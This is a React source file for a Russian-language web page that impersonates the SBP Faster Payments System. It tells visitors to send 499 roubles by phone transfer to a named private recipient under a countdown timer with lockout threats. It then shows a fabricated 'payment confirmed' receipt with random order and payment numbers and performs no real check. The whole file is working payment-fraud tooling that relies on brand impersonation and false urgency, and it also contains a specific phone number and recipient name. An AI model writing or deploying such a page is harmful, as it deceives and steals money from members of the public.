import React, { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader } from '@/components/ui/card';
import { Progress } from '@/components/ui/progress';
import { Alert, AlertDescription } from '@/components/ui/alert';
import Icon from '@/components/ui/icon';

type ViewState = 'loading' | 'payment' | 'checking' | 'success' | 'cancelled' | 'timeout' | 'info';

const Index = () => {
  const [viewState, setViewState] = useState<ViewState>('loading');
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes in seconds
  const [orderNumber, setOrderNumber] = useState('');
  const [operationNumber, setOperationNumber] = useState('');
  const [paymentNumber, setPaymentNumber] = useState('');

  // Generate random numbers
  useEffect(() => {
    setOrderNumber(`ORD-${Math.random().toString(36).substr(2, 9).toUpperCase()}`);
    setOperationNumber(`OP-${Math.random().toString(36).substr(2, 12).toUpperCase()}`);
    setPaymentNumber(`PAY-${Math.random().toString(36).substr(2, 10).toUpperCase()}`);
  }, []);

  // Loading animation
  useEffect(() => {
    if (viewState === 'loading') {
      const interval = setInterval(() => {
        setLoadingProgress(prev => {
          if (prev >= 100) {
            clearInterval(interval);
            setViewState('payment');
            return 100;
          }
          return prev + 1;
        });
      }, Math.random() * 100 + 80); // 8-13 seconds total

      return () => clearInterval(interval);
    }
  }, [viewState]);

  // Timer countdown
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (viewState === 'payment' && timeLeft > 0) {
      interval = setInterval(() => {
        setTimeLeft(prev => {
          if (prev <= 1) {
            setViewState('timeout');
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [viewState, timeLeft]);

  // Auto-redirect from timeout
  useEffect(() => {
    if (viewState === 'timeout') {
      const timer = setTimeout(() => {
        setViewState('info');
      }, 180000); // 3 minutes
      return () => clearTimeout(timer);
    }
  }, [viewState]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const getCurrentDateTime = () => {
    const now = new Date();
    const moscowTime = new Date(now.getTime() + (3 * 60 * 60 * 1000)); // UTC+3
    return moscowTime.toLocaleString('ru-RU', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    });
  };

  const handlePaymentCheck = () => {
    setViewState('checking');
    setTimeout(() => {
      setViewState('success');
    }, Math.random() * 3000 + 7000); // 7-10 seconds
  };

  const handleCancel = () => {
    setViewState('cancelled');
    setTimeout(() => {
      setViewState('info');
    }, 10000);
  };

  const handleRetry = () => {
    setViewState('loading');
    setLoadingProgress(0);
    setTimeLeft(300);
    // Generate new numbers
    setOrderNumber(`ORD-${Math.random().toString(36).substr(2, 9).toUpperCase()}`);
    setOperationNumber(`OP-${Math.random().toString(36).substr(2, 12).toUpperCase()}`);
    setPaymentNumber(`PAY-${Math.random().toString(36).substr(2, 10).toUpperCase()}`);
  };

  if (viewState === 'loading') {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="max-w-md w-full mx-4">
          <Card className="text-center p-8">
            <div className="mb-6">
              <div className="w-16 h-16 bg-sbp-blue rounded-full flex items-center justify-center mx-auto mb-4">
                <Icon name="CreditCard" className="text-white" size={32} />
              </div>
              <h1 className="text-2xl font-bold text-sbp-blue mb-2">СБП</h1>
              <p className="text-lg font-semibold mb-4">Система Быстрых Платежей</p>
            </div>
            
            <div className="space-y-4">
              <h2 className="text-lg font-semibold">Подготовка к оплате</h2>
              <p className="text-sm text-gray-600">
                Сейчас вам будет выдан номер телефона и название банка, на который нужно сделать перевод 
                через систему быстрых платежей (СБП) из вашего мобильного банка в течении 3 минут.
              </p>
              
              <div className="space-y-2">
                <div className="flex justify-between text-sm">
                  <span>Загрузка данных...</span>
                  <span>{loadingProgress}%</span>
                </div>
                <Progress value={loadingProgress} className="w-full" />
              </div>
              
              <div className="flex justify-center space-x-1 mt-4">
                <div className="w-2 h-2 bg-sbp-blue rounded-full animate-loading-dots"></div>
                <div className="w-2 h-2 bg-sbp-blue rounded-full animate-loading-dots" style={{animationDelay: '0.16s'}}></div>
                <div className="w-2 h-2 bg-sbp-blue rounded-full animate-loading-dots" style={{animationDelay: '0.32s'}}></div>
              </div>
            </div>
            
            <Alert className="mt-6 border-orange-200 bg-orange-50">
              <Icon name="AlertTriangle" className="text-orange-600" size={16} />
              <AlertDescription className="text-xs text-orange-800">
                ⚠️ Если вы не совершите перевод за это время, следующая попытка будет доступна только через час
              </AlertDescription>
            </Alert>
          </Card>
        </div>
      </div>
    );
  }

  if (viewState === 'payment') {
    return (
      <div className="min-h-screen bg-gray-50">
        <div className="max-w-2xl mx-auto p-4">
          <Card className="mb-6">
            <CardHeader className="text-center bg-sbp-blue text-white rounded-t-lg">
              <div className="flex items-center justify-center space-x-3">
                <Icon name="CreditCard" size={24} />
                <h1 className="text-xl font-bold">СБП - Система Быстрых Платежей</h1>
              </div>
            </CardHeader>
            <CardContent className="p-6">
              <div className="space-y-4">
                <div className="flex justify-between">
                  <span className="text-sm text-gray-600">Номер операции:</span>
                  <span className="font-mono text-sm">{operationNumber}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-sm text-gray-600">Дата и время:</span>
                  <span className="text-sm">{getCurrentDateTime()}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-sm text-gray-600">Номер заказа:</span>
                  <span className="font-mono text-sm">{orderNumber}</span>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="mb-6">
            <CardContent className="p-6">
              <h2 className="text-xl font-bold mb-4">Мини-Проверка на верность</h2>
              <div className="bg-blue-50 p-4 rounded-lg mb-4">
                <div className="flex justify-between items-center">
                  <span className="text-lg font-semibold">Сумма к оплате:</span>
                  <span className="text-2xl font-bold text-sbp-blue">499 ₽</span>
                </div>
              </div>
              
              <div className="space-y-3 mb-6">
                <h3 className="font-semibold">Реквизиты для перевода:</h3>
                <div className="bg-green-50 p-4 rounded-lg border-2 border-green-200">
                  <p className="font-semibold text-green-800">Переведите по номеру телефона:</p>
                  <p className="text-xl font-bold text-green-900">+7 981 848-79-57</p>
                  <p className="text-green-700">Яндекс Банк (Людмила Ивановна С.)</p>
                  <p className="text-green-700 font-semibold">Сумма: 499 рублей</p>
                </div>
              </div>

              <Alert className="mb-4 border-red-200 bg-red-50">
                <Icon name="AlertCircle" className="text-red-600" size={16} />
                <AlertDescription className="text-red-800">
                  <strong>Внимание:</strong> Переведите ровно ту сумму, которая указана выше. 
                  Если вы отправите не ту сумму или не в тот банк - платёж может быть утерян!
                </AlertDescription>
              </Alert>

              <div className="text-center mb-6">
                <div className="text-lg font-semibold mb-2">Время на перевод:</div>
                <div className={`text-3xl font-bold ${timeLeft < 60 ? 'text-red-600 animate-pulse-glow' : 'text-sbp-blue'}`}>
                  {formatTime(timeLeft)}
                </div>
                <div className="text-sm text-gray-600 mt-1">до автоматической отмены</div>
              </div>

              <div className="flex space-x-4">
                <Button 
                  onClick={handlePaymentCheck}
                  className="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 text-lg"
                >
                  <Icon name="CheckCircle" className="mr-2" size={20} />
                  Оплачено
                </Button>
                <Button 
                  onClick={handleCancel}
                  variant="outline"
                  className="flex-1 border-red-300 text-red-600 hover:bg-red-50 py-3 text-lg"
                >
                  <Icon name="X" className="mr-2" size={20} />
                  Отменить
                </Button>
              </div>
            </CardContent>
          </Card>

          <div className="text-xs text-gray-500 text-center space-y-1">
            <p>ООО "Верность"</p>
            <p>194021, г. Санкт-Петербург, пр-кт 2-й Муринский, д. 53</p>
            <p>Все права защищены © 2025</p>
          </div>
        </div>

        <footer className="bg-black text-white py-4 mt-8">
          <div className="text-center text-sm">
            <p>Все платежи проводятся Системой Быстрых Платежей.</p>
            <p>© 2025 Система Быстрых Платежей. Все права защищены.</p>
          </div>
        </footer>
      </div>
    );
  }

  if (viewState === 'checking') {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="max-w-md w-full mx-4">
          <Card className="text-center p-8">
            <div className="mb-6">
              <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse-glow">
                <Icon name="Search" className="text-sbp-blue" size={32} />
              </div>
              <h2 className="text-xl font-bold mb-4">Проверка платежа</h2>
              <p className="text-gray-600 mb-4">Проверяем поступление средств...</p>
              
              <div className="flex justify-center space-x-1">
                <div className="w-3 h-3 bg-sbp-blue rounded-full animate-loading-dots"></div>
                <div className="w-3 h-3 bg-sbp-blue rounded-full animate-loading-dots" style={{animationDelay: '0.16s'}}></div>
                <div className="w-3 h-3 bg-sbp-blue rounded-full animate-loading-dots" style={{animationDelay: '0.32s'}}></div>
              </div>
            </div>
          </Card>
        </div>
      </div>
    );
  }

  if (viewState === 'success') {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="max-w-md w-full mx-4">
          <Card className="text-center p-8">
            <div className="mb-6">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <Icon name="CheckCircle" className="text-green-600" size={32} />
              </div>
              <h2 className="text-xl font-bold text-green-600 mb-4">Платеж успешно подтвержден!</h2>
              
              <div className="bg-green-50 p-4 rounded-lg border border-green-200 mb-4">
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span>Номер платежа:</span>
                    <span className="font-mono">{paymentNumber}</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Сумма:</span>
                    <span className="font-bold">499 ₽</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Время:</span>
                    <span>{getCurrentDateTime()}</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Статус:</span>
                    <span className="text-green-600 font-semibold">Выполнен</span>
                  </div>
                </div>
              </div>
              
              <p className="text-green-700 text-sm">
                Спасибо за использование Системы Быстрых Платежей!
              </p>
            </div>
          </Card>
        </div>
      </div>
    );
  }

  if (viewState === 'cancelled') {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="max-w-md w-full mx-4">
          <Card className="text-center p-8">
            <div className="mb-6">
              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <Icon name="XCircle" className="text-red-600" size={32} />
              </div>
              <h2 className="text-xl font-bold text-red-600 mb-4">Платеж отменен</h2>
              <p className="text-gray-600">Операция была отменена пользователем</p>
            </div>
          </Card>
        </div>
      </div>
    );
  }

  if (viewState === 'timeout') {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="max-w-md w-full mx-4">
          <Card className="text-center p-8">
            <div className="mb-6">
              <div className="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <Icon name="Clock" className="text-orange-600" size={32} />
              </div>
              <h2 className="text-xl font-bold text-orange-600 mb-4">Платеж отменен</h2>
              <p className="text-gray-600 mb-6">Время ожидания истекло</p>
              
              <Button 
                onClick={handleRetry}
                className="bg-sbp-blue hover:bg-blue-700 text-white"
              >
                <Icon name="RotateCcw" className="mr-2" size={16} />
                Повторить оплату
              </Button>
            </div>
          </Card>
        </div>
      </div>
    );
  }

  if (viewState === 'info') {
    return (
      <div className="min-h-screen bg-gray-50">
        <div className="max-w-4xl mx-auto p-4">
          <Card className="mb-6">
            <CardHeader className="bg-sbp-blue text-white">
              <h1 className="text-2xl font-bold text-center">Информация о переводах и банковских услугах</h1>
            </CardHeader>
            <CardContent className="p-6 space-y-6">
              
              <div>
                <h2 className="text-xl font-bold mb-3 flex items-center">
                  <Icon name="Smartphone" className="mr-2 text-sbp-blue" />
                  Система Быстрых Платежей (СБП)
                </h2>
                <p className="text-gray-700 mb-4">
                  СБП — это платёжная система Банка России для мгновенных переводов по номеру телефона 
                  между физическими лицами, а также для оплаты товаров и услуг по QR-коду.
                </p>
                
                <div className="grid md:grid-cols-2 gap-4 mb-4">
                  <div className="bg-blue-50 p-4 rounded-lg">
                    <h3 className="font-semibold mb-2">Преимущества СБП:</h3>
                    <ul className="text-sm space-y-1">
                      <li>• Переводы 24/7 в любое время</li>
                      <li>• Мгновенное зачисление средств</li>
                      <li>• Переводы по номеру телефона</li>
                      <li>• Комиссия не более 30 ₽</li>
                    </ul>
                  </div>
                  <div className="bg-green-50 p-4 rounded-lg">
                    <h3 className="font-semibold mb-2">Лимиты переводов:</h3>
                    <ul className="text-sm space-y-1">
                      <li>• До 100 000 ₽ в месяц</li>
                      <li>• До 20 операций в сутки</li>
                      <li>• Минимум 10 ₽ за перевод</li>
                      <li>• Без комиссии до 100 000 ₽/мес</li>
                    </ul>
                  </div>
                </div>
              </div>

              <div>
                <h2 className="text-xl font-bold mb-3 flex items-center">
                  <Icon name="Building2" className="mr-2 text-sbp-blue" />
                  Ключевая ставка ЦБ РФ
                </h2>
                <div className="bg-gray-50 p-4 rounded-lg">
                  <p className="text-lg font-semibold mb-2">Текущая ключевая ставка: 21,00%</p>
                  <p className="text-sm text-gray-600">
                    Последнее изменение: 25 октября 2024 года. Следующее заседание: 20 декабря 2024 года.
                    Ключевая ставка влияет на кредитные и депозитные ставки в банках.
                  </p>
                </div>
              </div>

              <div>
                <h2 className="text-xl font-bold mb-3 flex items-center">
                  <Icon name="TrendingUp" className="mr-2 text-sbp-blue" />
                  Банковские новости и реформы
                </h2>
                <div className="space-y-3">
                  <div className="border-l-4 border-sbp-blue pl-4">
                    <h3 className="font-semibold">Развитие цифрового рубля</h3>
                    <p className="text-sm text-gray-600">
                      Банк России продолжает тестирование цифрового рубля с участием банков и организаций.
                      Планируется постепенное внедрение для населения.
                    </p>
                  </div>
                  <div className="border-l-4 border-green-500 pl-4">
                    <h3 className="font-semibold">Расширение СБП</h3>
                    <p className="text-sm text-gray-600">
                      Система Быстрых Платежей интегрируется с новыми сервисами и расширяет международное сотрудничество.
                    </p>
                  </div>
                </div>
              </div>

              <div>
                <h2 className="text-xl font-bold mb-3 flex items-center">
                  <Icon name="Shield" className="mr-2 text-sbp-blue" />
                  Безопасность платежей
                </h2>
                <div className="bg-yellow-50 p-4 rounded-lg border border-yellow-200">
                  <ul className="text-sm space-y-2">
                    <li>• Никогда не сообщайте коды из SMS третьим лицам</li>
                    <li>• Проверяйте реквизиты получателя перед переводом</li>
                    <li>• Используйте только официальные приложения банков</li>
                    <li>• При подозрительных операциях обращайтесь в банк</li>
                  </ul>
                </div>
              </div>

              <div className="text-center pt-6">
                <Button onClick={handleRetry} className="bg-sbp-blue hover:bg-blue-700 text-white">
                  <Icon name="ArrowLeft" className="mr-2" size={16} />
                  Вернуться к оплате
                </Button>
              </div>
              
            </CardContent>
          </Card>
        </div>

        <footer className="bg-black text-white py-4">
          <div className="text-center text-sm">
            <p>Все платежи проводятся Системой Быстрых Платежей.</p>
            <p>© 2025 Система Быстрых Платежей. Все права защищены.</p>
          </div>
        </footer>
      </div>
    );
  }

  return null;
};

export default Index;